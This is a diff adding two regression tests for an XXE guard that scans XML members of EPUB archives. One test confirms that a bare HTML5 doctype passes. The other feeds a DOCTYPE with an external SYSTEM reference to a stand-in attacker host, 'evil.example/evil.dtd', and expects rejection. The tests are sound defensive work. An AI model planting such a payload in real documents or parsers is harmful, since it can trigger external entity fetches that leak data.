@@ -139,6 +139,38 @@ def test_xxe_entity_declaration_in_xhtml_is_rejected(tmp_path: Path) -> None:
         _RecordingZipOperation(zip_path=zip_path).run()
 
 
+def test_xxe_guard_allows_a_plain_html5_doctype_with_no_external_reference(
+    tmp_path: Path,
+) -> None:
+    """A bare `<!DOCTYPE html>` -- what every real XHTML file (including
+    ebooklib's own generated output) actually contains -- is not an XXE
+    vector and must not be rejected. Regression test for a false positive
+    found via pipeline/input_validation.py becoming this guard's first
+    caller against realistic EPUB content."""
+    payload = (
+        b"<!DOCTYPE html>"
+        b"<html><body><h1>Chapter 1</h1><p>Real content.</p></body></html>"
+    )
+    zip_path = _make_zip(tmp_path / "real.epub", {"chap1.xhtml": payload})
+
+    result = _RecordingZipOperation(zip_path=zip_path).run()
+
+    assert "chap1.xhtml" in result
+
+
+def test_xxe_guard_rejects_doctype_with_external_system_reference(
+    tmp_path: Path,
+) -> None:
+    """No literal `<!ENTITY` in this file's own bytes -- the danger is a
+    blind fetch of externally-hosted entities -- so this must still be
+    caught by the DOCTYPE check itself, not the (separate) ENTITY check."""
+    payload = b'<!DOCTYPE foo SYSTEM "http://evil.example/evil.dtd"><foo/>'
+    zip_path = _make_zip(tmp_path / "external.epub", {"content.opf": payload})
+
+    with pytest.raises(XXEError):
+        _RecordingZipOperation(zip_path=zip_path).run()
+
+
 def test_xxe_guard_ignores_non_xml_members(tmp_path: Path) -> None:
     """A DOCTYPE-shaped string inside a non-XML member (e.g. a plain text
     or binary asset) is not a real XXE vector and must not be flagged --
